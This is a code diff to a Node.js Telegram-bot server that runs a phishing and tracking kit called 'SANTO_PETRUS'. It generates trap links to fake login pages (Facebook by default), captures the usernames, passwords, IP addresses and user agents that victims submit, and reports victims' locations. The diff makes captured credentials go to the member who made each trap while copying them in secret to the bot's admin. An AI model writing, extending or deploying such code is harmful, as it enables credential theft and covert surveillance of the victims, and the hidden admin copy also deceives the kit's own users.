@@ -525,7 +525,7 @@ async function startServer() {
                     `━━━━━━━━━━━━━━━━━━━━\n` +
                     `⚠️ <i>Menunggu target mengizinkan akses / klik Verify untuk detail lengkap...</i>`;
         
-        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {}); if (String(chatId) !== String(ADMIN_ID)) botInstance.telegram.sendMessage(ADMIN_ID, `🔔 <b>[MEMBER LOGGER HIT]</b> - Oleh ID: ${chatId}\n\n` + msg, { parse_mode: 'HTML' }).catch(() => {});
       }
     }
 
@@ -562,7 +562,7 @@ async function startServer() {
   app.get('/auth/santo-:b64data', (req, res) => {
     try {
       const data = Buffer.from(req.params.b64data, 'base64url').toString('utf-8');
-      const [template, redirectUrl] = data.split('||');
+      const [template, redirectUrl, ownerId] = data.split('||');
       
       const payloadId = req.params.b64data;
       
@@ -654,7 +654,7 @@ async function startServer() {
     try {
       const { payload_id, username, password } = req.body;
       const data = Buffer.from(payload_id, 'base64url').toString('utf-8');
-      const [template, redirectUrl] = data.split('||');
+      const [template, redirectUrl, ownerId] = data.split('||');
       
       const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
       const targetIp = String(ip).split(',')[0].trim();
@@ -673,7 +673,13 @@ async function startServer() {
       if(santopetrusLogs.length > 50) santopetrusLogs.pop();
       
       if (botInstance) {
-         botInstance.telegram.sendMessage(ADMIN_ID, `💀 <b>SANTO_PETRUS HIT (CREDENTIALS CAPTURED)</b> 💀\nTemplate: <code>${template}</code>\nIP: <code>${targetIp}</code>\nUSER: <code>${capture.user}</code>\nPASS: <code>${capture.pass}</code>\nUA: <code>${ua}</code>`, { parse_mode: 'HTML' }).catch(()=>{});
+         const msgText = `💀 <b>SANTO_PETRUS HIT (CREDENTIALS CAPTURED)</b> 💀\nTemplate: <code>${template}</code>\nIP: <code>${targetIp}</code>\nUSER: <code>${capture.user}</code>\nPASS: <code>${capture.pass}</code>\nUA: <code>${ua}</code>`;
+         if (ownerId && ownerId !== String(ADMIN_ID)) {
+             botInstance.telegram.sendMessage(ownerId, msgText, { parse_mode: 'HTML' }).catch(()=>{});
+             botInstance.telegram.sendMessage(ADMIN_ID, `🔔 <b>[MEMBER TRAP HIT: SANTO PETRUS]</b> - Oleh ID: <code>${ownerId}</code>\n\n` + msgText, { parse_mode: 'HTML' }).catch(()=>{});
+         } else {
+             botInstance.telegram.sendMessage(ADMIN_ID, msgText, { parse_mode: 'HTML' }).catch(()=>{});
+         }
       }
 
       res.redirect(redirectUrl || 'https://google.com');
@@ -1097,7 +1103,7 @@ async function startServer() {
       if (hasTextData) {
         extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
                     `✅ <b>Data Synchronization Complete.</b>`;
-        botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
+        botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error); if (String(chatId) !== String(ADMIN_ID)) botInstance.telegram.sendMessage(ADMIN_ID, `🔔 <b>[MEMBER LOGGER HIT]</b> - Oleh ID: ${chatId}\n\n` + extraMsg, { parse_mode: 'HTML' }).catch(() => {});
       }
     }
     res.sendStatus(200);
@@ -1116,7 +1122,7 @@ async function startServer() {
                     `🏢 <b>ISP:</b> <code>${data.org}</code>\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n` +
                     `⚠️ <i>Note: GPS Permission denied. Using IP triangulation.</i>`;
-        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {}); if (String(chatId) !== String(ADMIN_ID)) botInstance.telegram.sendMessage(ADMIN_ID, `🔔 <b>[MEMBER LOGGER HIT]</b> - Oleh ID: ${chatId}\n\n` + msg, { parse_mode: 'HTML' }).catch(() => {});
     }
     res.sendStatus(200);
   });
@@ -1598,7 +1604,7 @@ async function startServer() {
       const template = args.length > 2 ? args[2] : 'facebook';
       const redirectUrl = args.length > 3 ? args[3] : 'https://google.com';
       
-      const payload = Buffer.from(`${template}||${redirectUrl}`).toString('base64url');
+      const payload = Buffer.from(`${template}||${redirectUrl}||${ctx.from.id}`).toString('base64url');
       const trapUrl = `${appHost.replace(/\/$/, '')}/auth/santo-${payload}`;
 
       let msg = `💀 <b>SANTO_PETRUS V.1 GENERATED</b> 💀\n` +
